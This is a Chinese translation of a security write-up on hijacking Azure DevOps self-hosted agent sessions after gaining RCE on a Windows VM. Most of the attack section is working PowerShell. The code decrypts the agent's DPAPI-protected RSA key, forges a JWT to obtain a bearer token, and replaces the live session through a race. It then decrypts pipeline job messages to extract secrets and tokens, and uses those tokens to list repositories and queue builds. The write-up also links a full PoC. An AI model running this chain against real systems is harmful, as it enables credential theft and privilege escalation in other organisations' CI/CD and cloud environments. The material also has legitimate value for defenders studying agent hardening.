#  Azure DevOps代理通信劫持：从RCE到云权限提升  
Dubito
                    Dubito  云原生安全指北   2026-02-13 00:35  
  
   
  
> 注：本文翻译自 Critical Thinking - Diyan Apostolov 的文章  
《Azure DevOps Agent Interception》[1]  
，可点击文末“阅读原文”按钮查看英文原文。  
  
  
全文如下：  
## 一、引言  
  
设想这样一个场景：你刚刚在Windows Azure虚拟机上获取了RCE权限，正在思考如何扩大战果，这时注意到了Azure DevOps代理（Agent）文件夹。作为一名前DevOps工程师，我无法就此打住，于是开启了“批判性思维”模式。本文将完整记录如何拦截并解密Azure DevOps代理通信，最终从流水线（Pipeline）作业消息中提取令牌（Tokens）、密钥（Secrets）等敏感信息，以实现权限提升的技术流程。  
## 二、代理通信架构  
  
在展开具体的利用技术之前，我们首先需要对Azure Pipelines与Azure自托管代理（Self-Hosted Agents）之间的完整通信流程建立起基本的共识。  
### 2.1 代理注册机制  
  
Azure DevOps代理在配置时，会通过与Azure DevOps服务端建立信任关系，并将生成的认证材料保存在代理目录中（Windows系统默认路径：C:\azagent\A\*  
，其中*  
为本地安装的代理编号 - 1, 2, 3…）：  
  
<table><thead><tr><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">文件</span></section></th><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">用途</span></section></th></tr></thead><tbody><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">.agent</span></code></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">代理元数据（包含Pool ID、Agent ID、名称、服务端URL）</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">.credentials</span></code></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">OAuth客户端ID及授权URL</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">.credentials_rsaparams</span></code></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">RSA密钥对，用于JWT签名与会话密钥交换</span></section></td></tr></tbody></table>  
  
通常情况下，代理文件夹默认对所有用户授予**读取**  
权限，这正是整套攻击路径得以成立的前提，因为这意味着我们可以读取.credentials_rsaparams  
文件。  
### 2.2 会话建立与消息机制  
  
注册成功后，代理将创建一个会话（Session）并开始轮询新的消息。与Azure DevOps服务端建立会话的完整通信序列如下：  
1. 1. **JWT身份验证**  
：代理使用RSA私钥签署JWT  
  
1. 2. **令牌交换**  
：通过OAuth端点将JWT兑换为Bearer令牌  
  
1. 3. **会话创建**  
：代理创建会话，并上传其RSA公钥  
  
1. 4. **密钥交换**  
：服务端返回经代理RSA公钥加密的、会话专用的AES密钥  
  
1. 5. **消息轮询**  
：代理使用会话ID轮询消息  
  
1. 6. **消息加密**  
：所有作业消息均使用会话密钥进行AES加密（每条消息都是经过加密的Pipeline完整信息，包括变量、secrets、令牌等）  
  
```
┌─────────┐                             ┌──────────────────┐│   代理  │                              │   Azure DevOps   │└────┬────┘                             └────────┬─────────┘     │                                           │     │────────── JWT（使用RSA私钥签署）───────────>│     │<────────────── Bearer令牌 ────────────────│     │                                           │     │─────────── 创建会话（上传RSA公钥）─────────>│     │<───────── 会话ID + 加密后的AES密钥 ─────────│     │                                           │     │──────────── 轮询消息（携带会话ID）──────────>│     │<──────────── AES加密的作业消息 ─────────────│
```  
## 三、利用流程  
### 3.1 前置条件  
  
拥有代理目录的读取权限。在默认配置下，代理安装目录通常对所有本地用户可读。  
### 3.2 攻击链概览  
```
┌─────────────────────────────────────────────────────────────────┐│ 1. 读取代理目录（默认权限允许）                                     │└─────────────────────────┬───────────────────────────────────────┘                          ▼┌─────────────────────────────────────────────────────────────────┐│ 2. 从.credentials_rsaparams解密RSA密钥                           │└─────────────────────────┬───────────────────────────────────────┘                          ▼┌─────────────────────────────────────────────────────────────────┐│ 3. 使用RSA密钥签署JWT → 兑换为Bearer令牌                           │└─────────────────────────┬───────────────────────────────────────┘                          ▼┌─────────────────────────────────────────────────────────────────┐│ 4. 劫持代理会话（删除原有会话 + 使用我们的公钥重新创建）              │└─────────────────────────┬───────────────────────────────────────┘                          ▼┌─────────────────────────────────────────────────────────────────┐│ 5. 当Pipeline运行时接收加密的作业消息                              │└─────────────────────────┬───────────────────────────────────────┘                          ▼┌─────────────────────────────────────────────────────────────────┐│ 6. 使用会话AES密钥解密消息                                        │└─────────────────────────┬───────────────────────────────────────┘                          ▼┌─────────────────────────────────────────────────────────────────┐│ 7. 从解密后的作业负载中提取OAuth令牌                               │└─────────────────────────┬───────────────────────────────────────┘                          ▼┌─────────────────────────────────────────────────────────────────┐│ 8. 访问Azure DevOps API（代码库、流水线、secrets等）               │└─────────────────────────────────────────────────────────────────┘
```  
  
整个利用链路始于采集代理配置数据，这些数据将在后续步骤中用于创建我们自己的会话，并向API发送请求：  
  
读取 .agent  
 文件以获取代理元数据：  
```
$agentPath = "C:\azagent\A1\"$agentConfig = Get-Content (Join-Path $agentPath ".agent") | ConvertFrom-Json$poolId = $agentConfig.poolId$agentId = $agentConfig.agentId$agentName = $agentConfig.agentName$serverUrl = $agentConfig.serverUrl
```  
  
读取 .credentials  
 文件以获取认证参数，例如OAuth URL和clientId  
（GUID）：  
```
$credentials = Get-Content (Join-Path $agentPath ".credentials") | ConvertFrom-Json$clientId = $credentials.data.clientId$authUrl = $credentials.data.authorizationUrl$tokenUrl = ($authUrl -split "/_apis")[0] + "/_apis/oauth2/token"
```  
  
收集本地安装的代理版本、Windows版本等信息（此处略过不表）。下一个关键步骤是重建RSA密钥，以便伪造我们自己的JWT。.credentials_rsaparams  
 文件使用DPAPI（CurrentUser范围）加密，因此可以解密：  
```
Add-Type -AssemblyName System.Security$encryptedBytes = [System.IO.File]::ReadAllBytes((Join-Path $agentPath ".credentials_rsaparams"))$decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(    $encryptedBytes,    $null,    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)$rsaKey = [Text.Encoding]::UTF8.GetString($decrypted) | ConvertFrom-Json
```  
  
解密后的JSON包含RSA密钥组件：  
- • modulus  
、exponent  
（公钥）  
  
- • d  
、p  
、q  
、dp  
、dq  
、inverseQ  
（私钥）  
  
获取已解密的RSA组件后，即可使用这些参数重建RSA密钥。  
```
$rsaParams = New-Object System.Security.Cryptography.RSAParameters$rsaParams.Modulus = [Convert]::FromBase64String($rsaKey.modulus)$rsaParams.Exponent = [Convert]::FromBase64String($rsaKey.exponent)$rsaParams.D = [Convert]::FromBase64String($rsaKey.d)$rsaParams.P = [Convert]::FromBase64String($rsaKey.p)$rsaParams.Q = [Convert]::FromBase64String($rsaKey.q)$rsaParams.DP = [Convert]::FromBase64String($rsaKey.dp)$rsaParams.DQ = [Convert]::FromBase64String($rsaKey.dq)$rsaParams.InverseQ = [Convert]::FromBase64String($rsaKey.inverseQ)$rsa = [System.Security.Cryptography.RSA]::Create()$rsa.ImportParameters($rsaParams)
```  
  
现在我们已准备好密钥，下一步是构造JWT并进行签名：  
```
$header = '{"alg":"RS256","typ":"JWT"}'$headerBase64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($header)).TrimEnd('=').Replace('+','-').Replace('/','_')$now = [int][double]::Parse((Get-Date -UFormat %s)) - 3600$payload = @{    sub = $clientId    iss = $clientId    aud = $tokenUrl    nbf = $now    iat = $now    exp = $now + 300    jti = [guid]::NewGuid().ToString()} | ConvertTo-Json -Compress$payloadBase64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($payload)).TrimEnd('=').Replace('+','-').Replace('/','_')$dataToSign = [Text.Encoding]::UTF8.GetBytes("$headerBase64.$payloadBase64")$sig = $rsa.SignData($dataToSign, [Security.Cryptography.HashAlgorithmName]::SHA256, [Security.Cryptography.RSASignaturePadding]::Pkcs1)$sigBase64 = [Convert]::ToBase64String($sig).TrimEnd('=').Replace('+','-').Replace('/','_')$jwt = "$headerBase64.$payloadBase64.$sigBase64"
```  
  
!!! 说明：如果你的本地时间与服务端时间存在较大偏差，可能需要调整 $now  
 变量。在我们测试过程中，由于仅存在1小时时差，设置 -3600 已足够。好消息是，Azure会在异常信息中返回服务端时间，因此你可以据此进行调整。  
  
JWT准备就绪后，即可将其兑换为Bearer令牌：  
```
$body = @{    client_assertion_type = "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"    client_assertion = $jwt    grant_type = "client_credentials"}$tokenResponse = Invoke-RestMethod -Uri $tokenUrl -Method POST -Body $body -ContentType "application/x-www-form-urlencoded"$token = $tokenResponse.access_token
```  
  
如前所述，Pipeline数据是以AES加密的消息形式传输，该密钥在会话创建阶段完成交换。因此我们有多种手段可供选择，例如内存转储等 - 不过这里我们采用更简洁的方式：通过日志搜索最近的会话ID（同时建议一并检索日志中的secrets信息…根据DevOps工程师的水平高低，你常常能在这里发现大量敏感信息 :）。接着，使用Bearer令牌在代理重新连接前删除该现有会话并创建新会话（纯粹的竞态条件），从而获取AES密钥并开始监听Pipeline。  
  
从代理日志中提取当前会话ID：  
```
$logsPath = Join-Path $agentPath "_diag"$latestLog = Get-ChildItem $logsPath -Filter "Agent_*.log" | Sort-Object LastWriteTime -Descending | Select-Object -First 1$logContent = Get-Content $latestLog.FullName -Raw# 查找最近的会话ID$allMatches = [regex]::Matches($logContent, "session\s*'([a-f0-9-]{36})'")$sessionId = $allMatches[$allMatches.Count - 1].Groups[1].Value
```  
  
删除现有会话，并使用攻击者控制的公钥创建新会话：  
```
$headers = @{    Authorization = "Bearer $token"    "Content-Type" = "application/json"    "User-Agent" = "VSServices/$agentVersion"    "X-TFS-FedAuthRedirect" = "Suppress"}# 删除现有会话$deleteUrl = "$serverUrl/_apis/distributedtask/pools/$poolId/sessions/$sessionId?api-version=7.0"Invoke-RestMethod -Uri $deleteUrl -Headers $headers -Method DELETE# 使用我们的RSA公钥创建新会话$sessionBody = @{    ownerName = $agentName    agent = @{        id = $agentId        name = $agentName        version = $agentVersion        osDescription = $osDescription    }    useFipsEncryption = $false    encryptionKey = @{        encrypted = $false        value = @{            exponent = $rsaKey.exponent            modulus = $rsaKey.modulus        }    }} | ConvertTo-Json -Depth 5$sessionsUrl = "$serverUrl/_apis/distributedtask/pools/$poolId/sessions?api-version=7.0"$sessionResponse = Invoke-RestMethod -Uri $sessionsUrl -Headers $headers -Method POST -Body $sessionBody -ContentType "application/json"
```  
  
服务端返回的会话AES密钥使用我们提供的RSA公钥加密，因此在使用前需先解密：  
```
$encryptedSessionKey = [Convert]::FromBase64String($sessionResponse.encryptionKey.value)$sessionAesKey = $rsa.Decrypt($encryptedSessionKey, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA1)POWERSHELL
```  
  
现在我们即可开始轮询并解密拦截到的消息。  
```
$messagesUrl = "$serverUrl/_apis/distributedtask/pools/$poolId/messages?sessionId=$($sessionResponse.sessionId)&api-version=7.0"while ($true) {    $response = Invoke-RestMethod -Uri $messagesUrl -Headers $headers -Method GET -TimeoutSec 5    if ($response -and $response.body) {        $encBytes = [Convert]::FromBase64String($response.body)        $ivBytes = [Convert]::FromBase64String($response.iv)        $aes = [System.Security.Cryptography.Aes]::Create()        $aes.Key = $sessionAesKey        $aes.IV = $ivBytes        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7        $decryptor = $aes.CreateDecryptor()        $decryptedBytes = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length)        $decryptedMessage = [Text.Encoding]::UTF8.GetString($decryptedBytes)    }}POWERSHELL
```  
  
不同类型的Pipeline会泄露不同的访问令牌。其逻辑如下——例如，如果是一个纯构建部署Pipeline，这意味着我们获得的令牌将具备Git访问权限，以便克隆代码库进行构建……想想基础设施部署Pipeline的场景吧 :)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5DxluxkKwOrN1ic4Oo8jq6mC5XG1QOMLs0K71xheiatLn1G4ib51pnWqE9plH5TfKO9bIWBC9qQXVlNtxWtFgoCTaOwn7lcewbicSA/640?from=appmsg "null")  
  
一个有趣的旁注：Azure DevOps会向代理发送正则表达式模式，用于从Pipeline日志中擦除敏感值。这就是**密钥掩码配置（secret masking configuration）**  
。讽刺之处在于——这些掩码模式本身就是密钥（secret）。Azure DevOps本质上是在指示“从日志中隐藏这些值”，而为了实现这一点，它必须将实际的密钥值以正则表达式的形式发送给代理。因此，即使你在端点部分错过了某个令牌，也可以在掩码数组（mask array）中捕获到它。  
```
{    "mask": [        {            "type": "regex",            "value": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs..."  // <-- 这本身就是密钥令牌        }    ]}
```  
  
在端点中同样如此：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5AsrQ0qibnTM0XobuIw2Rk6LFnRibH2cyBVczTuaCEjM3aiaibCnkRibXowDI54wplTqoJ0miaXVzmbvpC54fSCDgov1KbWjOcAvHjRE/640?from=appmsg "null")  
  
完整PoC：https://gist.github.com/apostolovd/432ac96625097c9a2d436ae405ca00fd  
  
持有认证令牌后，我们便可以执行诸如查看代码库内容等操作。  
```
$accessToken = "TOKEN"$headers = @{    Authorization = "Bearer $accessToken"    "Content-Type" = "application/json"}    $items = Invoke-RestMethod -Uri "https://dev.azure.com/$orgName/_apis/git/repositories/$repoId/items?recursionLevel=Full&scopePath=/&api-version=7.0" -Headers $headers$items.value | Where-Object { -not $_.isFolder } | Select-Object path
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kric7mM9eA5Bnk2ic7xwh231xcZI0vwkjf1QhRu6WpT0ycKIbdPNicmBpqB4ARjAiaxSQG5PruSWtRXQIV0gTcvknEDDtpJrhf4TbLZlaYOlbn0/640?from=appmsg "null")  
  
或者触发一个构建任务，其中X为构建定义ID：  
```
$queueBody = @{ definition = @{ id = X } } | ConvertTo-JsonInvoke-RestMethod -Uri "https://dev.azure.com/$orgName/$projectId/_apis/build/builds?api-version=7.0" -Headers $headers -Method POST -Body $queueBody
```  
  
更多API端点请查阅Azure官方文档，尽享通过自托管代理实现云服务权限提升的乐趣吧。  
#### 引用链接  
  
[1]  
 《Azure DevOps Agent Interception》: https://lab.ctbb.show/writeups/azure-devops-agent-interception  
  
   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Kric7mM9eA5BXmu6SiaibBhPULCpfMLmJvuOtZP9UmPibso9GibmJRmKmgS3fiauaoNYqznIicuV7GO0UH7ibtSE093SHDpia7qlUNXk8557D44ZFJvA/640?wx_fmt=gif&from=appmsg "")  
  
  
  
**交流群**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5A5xjhcmFm3OTwKpxyzoL6zguprePTLw1YTyHdVsGDDNge5y6tzrgdnRlOZlkHjNEEg3CoAjs5Mkd46frzdcnrFXwEibpOML9Fk/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
